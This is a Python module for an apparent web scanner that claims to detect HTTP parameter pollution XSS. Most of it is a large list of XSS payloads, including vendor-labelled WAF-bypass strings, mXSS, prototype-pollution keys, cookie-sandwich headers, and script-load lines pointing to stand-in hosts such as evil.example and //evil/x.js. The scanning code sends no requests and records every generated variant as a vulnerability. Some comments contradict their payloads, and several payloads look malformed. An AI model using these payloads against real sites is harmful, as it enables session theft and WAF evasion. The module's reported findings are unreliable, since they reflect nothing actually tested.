"""
HTTP Parameter Pollution (HPP) XSS Detection Module.

Detects and exploits HTTP parameter pollution vulnerabilities:
- Duplicate parameter exploitation
- WAF bypass via parameter ordering
- Backend parameter merging vulnerabilities
"""

from typing import Dict, List, Set
from dataclasses import dataclass
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse


@dataclass
class HPPVulnerability:
    """HTTP Parameter Pollution vulnerability."""
    parameter: str
    pollution_type: str
    payload: str
    url: str
    severity: str
    waf_bypass: bool


class HPPDetector:
    """
    Advanced HTTP Parameter Pollution detector.
    Detects HPP vulnerabilities and WAF bypass opportunities.
    """

    # HPP pollution types
    POLLUTION_TYPES = {
    # ==============================================================
    # 1. Classic Query-String HPP
    # ==============================================================
    "duplicate": "Duplicate parameter (same name, different values)",

    "case_insensitive": "Case-insensitive parameter collision (id vs ID vs Id)",

    "encoding": "URL encoding variation (%69d, %2569d, +id, %20id)",

    "separator": "Separator variation (& vs ; vs %26 vs %3B)",

    "array": "Array notation (id[] vs id[0] vs id[key])",

    "dot": "Dot notation (param vs param.name vs param[0][name])",

    # ==============================================================
    # 2. Parser-Differential / Precedence Quirks
    # ==============================================================
    "first_wins": "First-occurrence wins (JSP/Tomcat, Python urllib.parse)",
    # id=admin&id=guest → server reads "admin"; WAF may inspect the last value.

    "last_wins": "Last-occurrence wins (PHP, Node.js querystring, Go net/url)",
    # id=admin&id=guest → server reads "guest"; WAF may inspect the first value.

    "comma_concat": "Comma-concatenation (ASP.NET / IIS, Java EE)",
    # id=admin&id=guest → server sees "admin,guest"; a payload split like
    # <scri&ipt>alert(1)</scri&ipt> reconstructs into valid HTML.

    "array_coerce": "Array coercion (Node.js Express, PHP)",
    # id=admin&id=guest → req.query.id becomes ["admin","guest"]; String()
    # coerces to "admin,guest", or code that expects a string may crash/reflect
    # both values.

    "bracket_merge": "Bracket-key deep merge (PHP, Rails, Express qs)",
    # user[name]=a&user[role]=admin → nested object; a "role" default can be
    # overwritten by an attacker-supplied nested key.

    "semicolon_query": "Semicolon as query separator (legacy Java/Spring, some WAFs)",
    # ?a=1;b=2 → browser sends it as one param; server splits on ';'.

    "encoded_ampersand": "Encoded ampersand (%26) split",
    # ?url=legit%26admin=1 → WAF decodes once, sees one param; app decodes
    # twice, sees two.

    "double_encoding": "Double URL-encoding (%2561 → %61 → a)",
    # WAF decodes once, app decodes again; payload emerges only on second decode.

    "unicode_normalization": "Unicode / fullwidth normalization (ａｄｍｉｎ → admin)",
    # WAF sees fullwidth chars; app's NFKC normalization converts to ASCII.

    "case_smuggling": "Case-smuggled parameter names (Role, ROLE, rOlE)",
    # Frameworks that treat names case-insensitively (ASP.NET Request.Form,
    # some PHP apps) collapse these; case-sensitive WAF rules do not.

    # ==============================================================
    # 3. Non-Query-String HPP Surfaces
    # ==============================================================
    "form_body": "Form-body duplicate keys (application/x-www-form-urlencoded)",
    # POST body: role=user&role=admin — same rules as query string, but the
    # body parser may differ from the query parser.

    "multipart_dup": "Multipart/form-data duplicate field names",
    # Each part has the same Content-Disposition name; parsers disagree on
    # merge behaviour (first, last, array, concat).

    "query_vs_body": "Query + body collision (parameter in both)",
    # POST /x?role=user with body role=admin — frameworks pick one source
    # (Express defaults to body, Spring can bind both).

    "query_vs_cookie": "Query + cookie collision (same name)",
    # Cookie session=user; query session=admin — some frameworks merge with
    # attacker-controlled precedence.

    "query_vs_header": "Query + header collision (X-Forwarded-* ambiguity)",
    # ?role=user with X-Role: admin — reverse proxies and app servers may
    # disagree on which to trust.

    "path_vs_query": "Path segment + query collision (/users/1?user=2)",
    # Router binds {id} from path, but controller also reads req.query.user.

    "duplicate_cookie": "Duplicate cookie names (session=a; session=b)",
    # Browsers send both; parsers pick first or last. Used in Cookie
    # Sandwich / Cookie Tossing attacks.

    "duplicate_header": "Duplicate HTTP headers (X-Forwarded-For: a, b)",
    # Proxies append, apps split on comma, WAFs may only see the first.

    "header_case": "Header case collision (X-Role vs x-role)",
    # HTTP/2 lowercases on the wire, but HTTP/1.1 preserves case; some
    # middlewares treat them as distinct.

    "content_type_dup": "Duplicate Content-Type / boundary injection",
    # Smuggle a second Content-Type header; parser disagreement determines
    # which body interpretation wins.

    # ==============================================================
    # 4. JSON & Structured-Data Pollution
    # ==============================================================
    "json_duplicate_key": "Duplicate JSON keys ({\"role\":\"user\",\"role\":\"admin\"})",
    # JSON.parse keeps the LAST; some libraries keep the FIRST; Jackson
    # (Java) keeps the LAST unless FAIL_ON_READING_DUP_TREE_KEY is set.

    "json_bracket_path": "JSON bracket-path pollution ({\"user[role]\":\"admin\"})",
    # Sent as form fields, parsed by qs/qs-like libraries into nested objects.

    "json_deep_merge": "JSON deep-merge pollution (nested __proto__ / constructor)",
    # {\"user\":{\"__proto__\":{\"isAdmin\":true}}} merged into a target
    # object pollutes Object.prototype in vulnerable merge functions.

    "json_unicode_key": "Unicode-equivalent JSON keys (\\u0072ole vs role)",
    # A WAF matching literal "role" misses the escaped form.

    "json_null_key": "Null-byte key truncation ({\"role\\u0000x\":\"admin\"})",
    # C-string-based parsers truncate at \\u0000, matching the "role" key.

    "json_type_confusion": "JSON type confusion ({\"id\":[\"1\",\"2\"]} vs {\"id\":\"1\"})",
    # Code expecting a string gets an array; coercions may produce "1,2" or
    # crash into an error page that reflects the raw value.

    "json_case_diff": "JSON key case differential (Role vs role)",
    # Same as case_smuggling, but at the JSON layer.

    # ==============================================================
    # 5. Framework / Platform-Specific
    # ==============================================================
    "spring_binding": "Spring MVC binding collision (request param + @ModelAttribute)",
    # Spring's WebDataBinder binds query params to object properties; a
    # duplicate param can override a server-set field (mass assignment).

    "aspnet_binding": "ASP.NET model binding collision",
    # ModelBinder reads "prefix.name" AND "name"; duplicated keys may
    # populate different properties with attacker-controlled values.

    "rails_bracket": "Rails nested-params pollution (user[admin]=1)",
    # Strong Parameters only filters what it declares; an extra bracket
    # key can slip through mass assignment.

    "php_bracket": "PHP bracket pollution (id[0]=1&id[1]=2)",
    # $_GET['id'] becomes an array; code expecting a string may cast to
    # "Array" (info-leak) or concatenate unexpectedly.

    "node_qs": "Node.js qs parsing depth / arrayLimit abuse",
    # qs has depth and arrayLimit caps; exceeding them changes the type
    # or drops keys — an application bug surfaces as a coercion sink.

    "golang_parseform": "Go net/url ParseForm merge rules",
    # ParseForm keeps the FIRST value for query, LAST for body; mixing
    # sources produces surprises.

    "graphql_variable": "GraphQL variable / argument duplication",
    # Duplicate variables in the operation document are rejected by spec
    # but some resolvers merge them.

    # ==============================================================
    # 6. Prototype & Object-Model Pollution
    # ==============================================================
    "proto_key": "Prototype pollution via __proto__ key",
    # ?__proto__[isAdmin]=true → Object.prototype polluted in vulnerable
    # merge/qs libraries.

    "constructor_key": "Prototype pollution via constructor.prototype key",
    # ?constructor[prototype][isAdmin]=true → same effect, evades
    # __proto__-only filters.

    "prototype_key": "Prototype pollution via prototype key",
    # ?prototype[isAdmin]=true — variants used when __proto__ and
    # constructor are blacklisted.

    "path_notation": "Path-notation pollution (a.b.c.isAdmin=true)",
    # Some libraries expand dot-paths into nested objects; that object
    # is then merged into a target, polluting its prototype.

    # ==============================================================
    # 7. Request-Smuggling / Protocol-Level Pollution
    # ==============================================================
    "cl_te": "Content-Length vs Transfer-Encoding disagreement",
    # Front-end reads Content-Length; back-end reads Transfer-Encoding.
    # Used to smuggle a second request carrying the polluting parameter.

    "te_cl": "Transfer-Encoding vs Content-Length disagreement",
    # Reverse of the above; whichever header each parser honours
    # determines where the request body ends.

    "obs_fold": "Obsolete line-folding in headers (multi-line values)",
    # A value split across continuation lines; parsers disagree on
    # whether the folded continuation is part of the value.

    "chunk_ext": "Chunked-encoding extension smuggling",
    # Chunk extension fields (;name=value) ignored by one parser but
    # treated as content by another.

    "http2_pseudo": "HTTP/2 pseudo-header ambiguity",
    # Mixing :path with a raw query string can make the front-end and
    # back-end disagree on the effective query.

    # ==============================================================
    # 8. Routing / Rewrite-Layer HPP
    # ==============================================================
    "rewrite_append": "Rewrite rule append (?a=1 + rewrite to ?a=2)",
    # mod_rewrite appends with '?a=2' replacing or adding depending on
    # the [QSA] flag; downstream only sees one.

    "proxy_merge": "Reverse-proxy query merge (upstream + downstream)",
    # Nginx proxy_pass with $args can duplicate params already present.

    "load_balancer_dup": "CDN / load-balancer query duplication",
    # Some CDNs append cache-busting params (e.g. ?_=123); if they do
    # not strip a client-supplied duplicate, precedence confusion follows.

    "url_rewrite_bracket": "URL rewrite bracket expansion (/a[b] → ?a[b]=)",
    # Framework rewrite may convert a path segment into a bracketed
    # query key that then merges into the binding object.
}


    # Common parameter names that are often vulnerable to HPP
    VULNERABLE_PARAMS = [
        # ==============================================================
    # 1. Open Redirect & SSRF (parameter precedence abuse)
    # ==============================================================
    "redirect", "redirect_uri", "redirect_url",
    "url", "uri", "link", "goto", "dest", "destination",
    "target", "out", "view", "location", "r", "u",
    "next", "return", "return_url", "returnTo", "returnto",
    "continue", "forward", "back", "callback",
    "callback_url", "webhook", "webhook_url", "postback",
    "proxy", "fetch", "load", "source", "src", "href",

    # ==============================================================
    # 2. Authorization, Privilege & Identity (HPP logic bypass)
    # ==============================================================
    "user", "username", "userid", "user_id", "uid",
    "role", "roles", "admin", "is_admin", "privilege",
    "account", "account_id", "customer", "customer_id",
    "owner", "owner_id", "author", "author_id",
    "tenant", "tenant_id", "org", "org_id", "group",
    "group_id", "team", "team_id", "workspace",
    "email", "mail", "login", "identity", "subject",
    "blogID", "post_id", "article_id", "document_id",  # Blogger CVE pattern

    # ==============================================================
    # 3. Authentication, OTP & Token Handling
    # ==============================================================
    "otp", "code", "verification_code", "verify_code",
    "token", "auth_token", "access_token", "refresh_token",
    "session", "sessionid", "session_id", "sess_id",
    "csrf", "csrf_token", "xsrf", "xsrf_token",
    "_csrf", "authenticity_token", "security_token",  # Blogger CVE
    "nonce", "state", "signature", "sig", "hash",
    "password", "passwd", "secret", "key", "api_key",

    # ==============================================================
    # 4. Business Logic: Price, Quantity & Transaction Values
    # ==============================================================
    "amount", "price", "total", "cost", "fee",
    "quantity", "qty", "count", "num", "number",
    "discount", "coupon", "promo", "voucher", "rate",
    "currency", "tax", "shipping", "balance", "credit",

    # ==============================================================
    # 5. Injection Delivery: XSS / SQLi / Command Injection
    # ==============================================================
    "q", "query", "search", "keyword", "keywords", "term",
    "s", "find", "filter", "input", "data", "content",
    "message", "text", "comment", "description", "body",
    "title", "name", "label", "value", "param",
    "id", "page", "file", "path", "dir", "folder",
    "host", "hostname", "domain", "ip", "port",

    # ==============================================================
    # 6. Format, Locale & Rendering Preferences
    # ==============================================================
    "format", "type", "mode", "action", "method",
    "lang", "language", "locale", "country", "region",
    "theme", "template", "style", "layout", "skin",
    "encoding", "charset", "output", "render",

    # ==============================================================
    # 7. Array / Bracket-Style Parameters (framework-specific HPP)
    # ==============================================================
    "id[]", "ids[]", "user[]", "role[]", "name[]",
    "param[]", "data[]", "item[]", "filter[]",
    "options[key]", "config[key]", "meta[key]",

    # ==============================================================
    # 8. WebSocket / Message-Payload Parameters
    # ==============================================================
    "room", "channel", "topic", "event", "msg",
    "payload", "body", "frame", "opcode", "command",
    ]

    # XSS payloads for HPP testing
    XSS_PAYLOADS = [
        # ==============================================================
    # 1. Baseline & Single-Payload Vectors
    # ==============================================================
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "javascript:alert(1)",
    "<iframe srcdoc=\"<script>alert(1)</script>\">",
    "\"><img src=x onerror=alert(1)>",  # Context-breaking baseline

    # ==============================================================
    # 2. HPP Split-Across-Duplicates (WAF bypass core)
    # ==============================================================
    # WAF inspects each occurrence; app concatenates into valid JS.
    # ASP.NET/IIS concatenates with commas → q=1'&q=alert(1)&q='2
    "q=1'&q=alert(1)&q='2",
    "search=<script>&search=alert(1)</script>",
    "id=1&id=';alert(1)//",
    "name=foo&name=<img src=x onerror=alert(1)>",
    "param=1&param=2&param=<svg onload=alert(1)>",

    # Semicolon-bridged split (high WAF bypass rate per Ethiack research)
    "q=1'+1;let+asd=window&q=def='al'+'ert'+;asd[def](1&q=2)",

    # Newline-bridged split (70.6% bypass rate in published research)
    "q=1'%0aasd=window&q=def=\"al\"+\"ert\";asd[def](1)",

    # Comment-bridged split (HackIndex technique)
    "q=<script>&q=/*&q=*/alert(1)//</script>",

    # ==============================================================
    # 3. Obfuscated & Encoded Payloads
    # ==============================================================
    # HTML entity encoding
    "<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>",

    # Unicode escape (breaks keyword signatures)
    "<script>\\u0061lert(1)</script>",

    # String.fromCharCode construction
    "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",

    # atob / Base64
    "<script>eval(atob('YWxlcnQoMSk='))</script>",

    # Constructor chain (no "alert" string in source)
    "<svg onload=\"new Function`[\"Y000!\"].find(alert)`\">",

    # Base-30 numeric encoding
    "<img src=x onerror=top[8680439..toString(30)](1)>",

    # Backtick execution (no parentheses)
    "<script>alert`1`</script>",

    # Comment injection inside keywords
    "<script>e/**/v/**/a/**/l(document./**/cookie)</script>",

    # Bracket notation (evades "document.cookie" regex)
    "<script>alert(document['cookie'])</script>",
    "<script>alert(window['document']['cookie'])</script>",

    # ==============================================================
    # 4. Polyglot & Context-Breaking Payloads
    # ==============================================================
    # Jackmasa-style polyglot (works in HTML, attribute, JS string contexts)
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",

    # Compact HTML/attribute polyglot
    "\"><img src=x onerror=alert(1)>\".<script>alert(1)</script>",

    # JS string escape + comment
    "';alert(1)//",
    "\\';alert(1)//",

    # ==============================================================
    # 5. SVG-Specific Vectors (often bypass tag filters)
    # ==============================================================
    "<svg><script>alert(1)</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set attributeName=onmouseover to=alert(1)>",
    "<svg><script href=\"data:text/javascript,alert(1)\"/>",
    "<svg><style>{font-family:'<iframe/onload=confirm(1)>'",

    # ==============================================================
    # 6. Framework / Stack-Specific Payloads
    # ==============================================================
    # ASP.NET/IIS concatenation exploitation (comma join)
    "q=1&q=2&q=<script>alert(1)</script>",

    # PHP/Apache last-wins exploitation (payload in the LAST occurrence)
    "q=<script>alert(1)</script>&q=1",

    # JSP/Tomcat first-wins exploitation (payload in the FIRST occurrence)
    "q=<script>alert(1)</script>&q=1",

    # Node.js/Express array coercion (payload in the second element)
    "q=1&q=<script>alert(1)</script>",

    # ==============================================================
    # 7. Client-Side HPP (URL re-parsing / DOM injection)
    # ==============================================================
    # Inject a second parameter into a URL that the client later navigates to.
    # Classic poll_id=456842&candidate%3Dgreen pattern.
    "poll_id=456842&candidate%3Dgreen",
    "poll_id=456842&candidate%3Dattacker",

    # Double-encoded ampersand to smuggle a parameter
    "url=legit%26redirect%3Dhttps://evil.example",

    # Nested bracket injection (framework-specific)
    "filter[key1]=v1&filter[key2]=<img src=x onerror=alert(1)>",

    # JSON duplicate key (last-wins in most parsers)
    '{"user":"guest","user":"admin","payload":"<script>alert(1)</script>"}',

    # ==============================================================
    # 8. WAF-Specific Bypass (published bypasses)
    # ==============================================================
    # --- Cloudflare ---
    "<svg onload=alert%26%230000000040\"1')>",                                   # Unicode entity splice (2026 bypass)
    "<svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b>",        # Unicode + comment split
    "<Svg Only=1 OnLoad=confirm(atob(\"Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ==\"))>",     # Base64-obfuscated confirm
    "<img src=& onerror=confirm(document.cookie)>",                               # `&` parsed as entity start by WAF
    "<img src=& onerror=src='//a.to/?",                                           # Continuation of `&` entity trick

    # --- ModSecurity / OWASP CRS ---
    "<script/*comment*/>alert(1)</script>",                                       # Comment inside tag breaks rule regex
    "<img src=x onerror=\"\\u0061\\u006c\\u0065\\u0072\\u0074(1)\">",             # Mixed JS unicode escapes in attribute
    "<scri%00pt>alert(1)</scri%00pt>",                                            # Null byte truncates rule matching
    "<xml onreadystatechange=alert(1)>",                                          # Uncommon tag not in CRS
    "<svg onload='new Function*[\"Y000!\"].find(al\\u0065rt)*'>",                 # ModSecurity constructor-chain bypass
    "?x=<scri&x=pt>alert(1)</scri&x=pt",                                         # CRS via parameter pollution (CVE-2026-21876 / CVE-2026-61812)

    # --- AWS WAF ---
    "<ScRiPt>alert(1)</ScRiPt>",                                                  # Case variation in unusual combos
    "<a href=\"javASCRIPT:alert(1)\">",                                           # Non-standard protocol casing
    "<svg><script>alert(1)</script></svg>",                                       # SVG often uncovered by XSS rule groups
    "<iframe srcdoc=\"<script>alert(1)</script>\"></iframe>",                     # srcdoc vector often missed
    "<img src=`x`onerror=`confirm\\`1\\``>",                                      # Backtick-only polyglot
    "<a href=\"javascript://attacker.com/%0Aalert(1)\">XSS</a>",                  # Comment in javascript: protocol

    # --- Akamai ---
    "<!--><svg+onload=%27top[%2fal%2f%2esource%2b",                               # Advanced bypass (HTML comment + encoded source chain)
    "<!--[if<img src=x onerror=javascript:alert(1)//]> -->",                      # Conditional-comment bypass (ATR-2026-00489)

    # --- Imperva ---
    "<details x=xxxxxxxx 2 Open ontoggle=kaalert(origin)>",                       # Imperva toggle bypass
    "'+{a:alert(1)}",                                                             # Alternative JS syntax evades alert( signature

    # --- F5 BIG-IP ASM ---
    "<svg onload%w==alert()>",                                                    # Hex Overflow (%0d → %w=)
    "<svg onload%0==alert()>",                                                    # Hex Overflow variant (%0d → %0=)

    # --- Azure WAF (DRS 2.1) ---
    "test\\';alert(1);//",                                                        # Escape-character parsing differential (AI-discovered)

    # --- Sucuri ---
    "<scr\u200Bipt>alert(1)</scr\u200Bipt>",                                      # Zero-width space breaks /script/i
    "<script%2fsrc=//evil/x.js>",                                                 # <script%2fsrc bypass

    # --- Cross-WAF: Encoded whitespace / control bytes (ATR-2026-00489) ---
    "<a href=\"\\x0Bjavascript:javascript:alert(1)\" id=\"fuzzelement1\">test</a>",  # Vertical-tab prefix
    "<html onMouseLeave html onMouseLeave=\"javascript:javascript:alert(1)\"></html onMouseLeave>",  # Obscure handler + encoded context
    "<img src=x onerror=\\x11\"javascript:alert(1)\">",                           # Device-control byte before javascript:
    "ABC<div style=\"x:\\xE2\\x80\\x89expression(javascript:alert(1)\">DEF",      # Thin-space in CSS expression()
    "\"'><img src=xxx:x \\x20onerror=javascript:alert(1)>",                       # Encoded space before onerror

    # --- Cross-WAF: Fullwidth / homoglyph ---
    "＜script＞alert(1)＜/script＞",                                              # Fullwidth < > may normalize in browser, not WAF

    # --- Cross-WAF: Stacked encoding (WAF decodes once, app twice) ---
    "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",                             # Base64 alert(1)
    "<svg onload=eval(decodeURIComponent('%61%6C%65%72%74%28%31%29'))>",          # URL-encoded alert(1)
    "<img src=x onerror=eval(atob(decodeURIComponent('%59%57%78%6C%63%6E%51%6F%4D%53%6B%3D')))>",  # Triple-stack

    # --- Cross-WAF: mXSS (safe when sanitized, executable on re-parse) ---
    "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",  # Classic DOMPurify mXSS
    "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",            # Noscript mutation
    "<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>",  # Survives multiple parse cycles

    # --- Cross-WAF: Constructor-chain / no-keyword execution ---
    "<svg onload=\"new Function`[\"Y000!\"].find(alert)`\">",                     # No "alert" string in source
    "<img src=x onerror=top[8680439..toString(30)](1)>",                          # Base-30 numeric encoding of "alert"
    "<img/src=x/onerror=this[location.hash.slice(1)](1)>",                        # Execution via location.hash slice
    "<form><isindex formaction=javascript:alert(1) type=submit>",                 # When on*= is filtered but javascript: URL allowed

    # --- Cross-WAF: Parameter pollution + JS injection (F5 K000159772, Ethiack research) ---
    "q=1'&q=alert(1)&q='2",                                                       # ASP.NET/IIS comma-concatenation
    "q=1'+1;let+asd=window&q=def='al'+'ert'+;asd[def](1&q=2)",                    # Semicolon-bridged split (52.9% bypass)
    "q=1'%0aasd=window&q=def=\"al\"+\"ert\";asd[def](1)",                         # Newline-bridged split (70.6% bypass)
    "page=select 1&page=2,3 from table",                                          # ModSecurity HPP concatenation (SQLi shape, same trick)
    # ==============================================================
    # 9. Cookie / Header HPP (adjacent to parameter pollution)
    # ==============================================================
    # Duplicate cookie names (parsers disagree on which wins)
    "Cookie: session=legit; session=attacker",
    "Cookie: role=user; role=admin",

    # Cookie sandwich to trap HttpOnly (from earlier cookie research)
    "Cookie: $Version=1; param1=\"start; session=SECRET; param2=end\";",
    ]

    def __init__(self):
        self._tested_urls: Set[str] = set()
        self._vulnerabilities: List[HPPVulnerability] = []

    def parse_parameters(self, url: str) -> Dict[str, List[str]]:
        """
        Parse URL query string into parameter dictionary with multiple values.

        Args:
            url: Target URL

        Returns:
            Dictionary mapping parameter names to list of values
        """
        parsed = urlparse(url)
        params: Dict[str, List[str]] = {}

        for name, value in parse_qsl(parsed.query, keep_blank_values=True):
            if name not in params:
                params[name] = []
            params[name].append(value)

        return params

    def detect_duplicate_parameters(self, url: str) -> List[str]:
        """
        Detect parameters that appear multiple times in the URL.

        Args:
            url: Target URL

        Returns:
            List of parameter names with duplicates
        """
        params = self.parse_parameters(url)
        duplicates = [name for name, values in params.items() if len(values) > 1]
        return duplicates

    def generate_hpp_variants(
        self,
        url: str,
        parameter: str,
        xss_payload: str,
        marker: str = "xoxss"
    ) -> List[str]:
        """
        Generate HPP URL variants for testing.

        Args:
            url: Original URL
            parameter: Parameter to pollute
            xss_payload: XSS payload to inject
            marker: Unique marker

        Returns:
            List of polluted URL variants
        """
        parsed = urlparse(url)
        query_params = parse_qsl(parsed.query, keep_blank_values=True)

        # Replace alert(1) with marker
        payload = xss_payload.replace("alert(1)", f"alert('{marker}')")

        variants = []

        # Variant 1: Duplicate parameter with XSS
        polluted_params = [*query_params, (parameter, payload)]
        new_query = urlencode(polluted_params, doseq=True)
        variants.append(urlunparse(parsed._replace(query=new_query)))

        # Variant 2: Case-insensitive variation
        for name, value in query_params:
            if name.lower() == parameter.lower():
                polluted_params = [(name, value), (name.upper(), payload)]
                new_query = urlencode(polluted_params, doseq=True)
                variants.append(urlunparse(parsed._replace(query=new_query)))
                break

        # Variant 3: Array notation
        polluted_params = [*query_params, (f"{parameter}[]", payload)]
        new_query = urlencode(polluted_params, doseq=True)
        variants.append(urlunparse(parsed._replace(query=new_query)))

        # Variant 4: Dot notation
        polluted_params = [*query_params, (f"{parameter}.xss", payload)]
        new_query = urlencode(polluted_params, doseq=True)
        variants.append(urlunparse(parsed._replace(query=new_query)))

        # Variant 5: URL encoding variation
        encoded_payload = payload.replace("<", "%3C").replace(">", "%3E")
        polluted_params = [*query_params, (parameter, encoded_payload)]
        new_query = urlencode(polluted_params, doseq=True)
        variants.append(urlunparse(parsed._replace(query=new_query)))

        # Variant 6: Parameter reordering (XSS before original)
        polluted_params = [(parameter, payload), *query_params]
        new_query = urlencode(polluted_params, doseq=True)
        variants.append(urlunparse(parsed._replace(query=new_query)))

        return variants

    def test_waf_bypass_via_hpp(self, url: str, parameter: str) -> bool:
        """
        Test if HPP can bypass WAF filters.

        Args:
            url: Target URL
            parameter: Parameter to test

        Returns:
            True if WAF bypass potential detected
        """
        params = self.parse_parameters(url)

        # Check if parameter already has multiple values
        if parameter in params and len(params[parameter]) > 1:
            return True

        # Check for case-insensitive collisions
        param_lower = parameter.lower()
        for name in params.keys():
            if name.lower() == param_lower and name != parameter:
                return True

        return False

    def scan_for_hpp_vulnerabilities(
        self,
        url: str,
        marker: str = "xoxss"
    ) -> List[HPPVulnerability]:
        """
        Scan URL for HPP vulnerabilities.

        Args:
            url: Target URL
            marker: Unique marker

        Returns:
            List of detected HPP vulnerabilities
        """
        self._vulnerabilities = []

        if url in self._tested_urls:
            return self._vulnerabilities

        self._tested_urls.add(url)

        # Detect duplicate parameters
        duplicates = self.detect_duplicate_parameters(url)

        for param in duplicates:
            # Test WAF bypass potential
            waf_bypass = self.test_waf_bypass_via_hpp(url, param)

            # Generate variants with XSS payload
            for payload in self.XSS_PAYLOADS:
                variants = self.generate_hpp_variants(url, param, payload, marker)

                for variant_url in variants:
                    vuln = HPPVulnerability(
                        parameter=param,
                        pollution_type="duplicate",
                        payload=payload,
                        url=variant_url,
                        severity="high" if waf_bypass else "medium",
                        waf_bypass=waf_bypass
                    )
                    self._vulnerabilities.append(vuln)

        # Test common vulnerable parameters even if not duplicated
        params = self.parse_parameters(url)
        for param in self.VULNERABLE_PARAMS:
            if param in params or any(p.lower() == param.lower() for p in params.keys()):
                for payload in self.XSS_PAYLOADS:
                    variants = self.generate_hpp_variants(url, param, payload, marker)
                    for variant_url in variants:
                        vuln = HPPVulnerability(
                            parameter=param,
                            pollution_type="injection",
                            payload=payload,
                            url=variant_url,
                            severity="medium",
                            waf_bypass=False
                        )
                        self._vulnerabilities.append(vuln)

        return self._vulnerabilities

    def assess_hpp_risk(self, vulnerabilities: List[HPPVulnerability]) -> str:
        """Assess overall HPP risk."""
        if not vulnerabilities:
            return "none"

        waf_bypass_count = sum(1 for v in vulnerabilities if v.waf_bypass)
        if waf_bypass_count > 0:
            return "critical"

        if len(vulnerabilities) > 5:
            return "high"

        return "medium"

    def get_hpp_summary(self) -> Dict[str, int]:
        """Get summary of HPP findings."""
        summary = {
            "total_vulnerabilities": len(self._vulnerabilities),
            "waf_bypass": sum(1 for v in self._vulnerabilities if v.waf_bypass),
            "by_severity": {
                "critical": sum(1 for v in self._vulnerabilities if v.severity == "critical"),
                "high": sum(1 for v in self._vulnerabilities if v.severity == "high"),
                "medium": sum(1 for v in self._vulnerabilities if v.severity == "medium"),
            },
        }
        return summary


__all__ = [
    "HPPDetector",
    "HPPVulnerability",
]
